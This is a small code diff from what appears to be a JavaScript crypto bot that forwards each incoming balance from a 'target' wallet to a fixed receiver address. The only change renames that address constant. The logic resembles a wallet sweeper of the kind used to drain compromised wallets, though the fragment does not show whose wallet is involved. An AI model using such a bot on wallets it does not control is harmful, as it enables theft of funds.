@@ -38,7 +38,7 @@ const bot = async () => {
                 console.log(`Received Crypto ${balanceinEther}`)
                 try {
                     await target.sendTransaction({
-                        to: ADDRESS_RECEIVER,
+                        to: RECEIVER_ADDRESS,
                         value: withdrawAmount.toString(),
                         gasPrice: currentGasPrice.toString(),
                         gasLimit: GAS_LIMIT.toString()
